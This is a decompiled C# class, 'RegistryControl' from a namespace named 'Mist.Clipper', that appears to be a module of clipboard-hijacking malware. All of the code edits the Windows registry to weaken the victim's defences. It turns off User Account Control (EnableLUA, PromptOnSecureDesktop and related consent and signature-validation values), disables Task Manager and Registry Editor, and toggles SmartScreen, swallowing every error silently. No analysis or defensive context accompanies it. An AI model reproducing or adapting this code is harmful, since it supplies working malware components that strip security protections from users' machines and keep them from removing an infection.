using System;
using Microsoft.Win32;

namespace Mist.Clipper
{
	// Token: 0x02000080 RID: 128
	public class RegistryControl
	{
		// Token: 0x17000060 RID: 96
		// (get) Token: 0x060002EC RID: 748 RVA: 0x00005BAC File Offset: 0x00003DAC
		public static RegistryView Regview
		{
			get
			{
				if (RunCheck.StartWin_xSixtyFour())
				{
					return RegistryView.Registry64;
				}
				return RegistryView.Registry32;
			}
		}

		// Token: 0x060002ED RID: 749 RVA: 0x0001377C File Offset: 0x0001197C
		public static bool ToogleUacAdmin(string regpath, int locker)
		{
			bool result;
			try
			{
				if (RunCheck.IsUserAdministrator())
				{
					using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryControl.Regview))
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
						{
							try
							{
								foreach (string name in RegistryControl.FieldsLocal)
								{
									try
									{
										registryKey2.SetValue(name, locker, RegistryValueKind.DWord);
									}
									catch
									{
									}
								}
							}
							catch (Exception)
							{
								return false;
							}
							return true;
						}
					}
				}
				result = true;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060002EE RID: 750 RVA: 0x00013848 File Offset: 0x00011A48
		public static bool ToogleTaskMandRegedit(string regpath, int locker)
		{
			bool result;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryControl.Regview))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
					{
						using (RegistryKey registryKey3 = registryKey2.CreateSubKey("System"))
						{
							registryKey3.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
							registryKey3.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
							try
							{
								foreach (string name in RegistryControl.FiledsSystem)
								{
									try
									{
										registryKey3.SetValue(name, locker);
									}
									catch
									{
									}
								}
							}
							catch (Exception)
							{
								return false;
							}
							result = true;
						}
					}
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060002EF RID: 751 RVA: 0x00013954 File Offset: 0x00011B54
		public static bool ToogleSmartScreen(string regpath, string name, string enable)
		{
			bool result;
			try
			{
				if (RunCheck.IsUserAdministrator())
				{
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regpath, true))
					{
						try
						{
							registryKey.SetValue(name, enable, RegistryValueKind.String);
							return true;
						}
						catch
						{
							return false;
						}
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x04000182 RID: 386
		public static readonly string[] FieldsLocal = new string[]
		{
			"EnableLUA",
			"EnableInstallerDetection",
			"PromptOnSecureDesktop",
			"ConsentPromptBehaviorAdmin",
			"ConsentPromptBehaviorUser",
			"EnableSecureUIAPaths",
			"ValidateAdminCodeSignatures",
			"EnableSmartScreen",
			"EnableVirtualization",
			"EnableUIADesktopToggle",
			"FilterAdministratorToken"
		};

		// Token: 0x04000183 RID: 387
		public static readonly string[] FiledsSystem = new string[]
		{
			"ConsentPromptBehaviorAdmin",
			"DisableRegistryTools",
			"DisableTaskMgr"
		};
	}
}
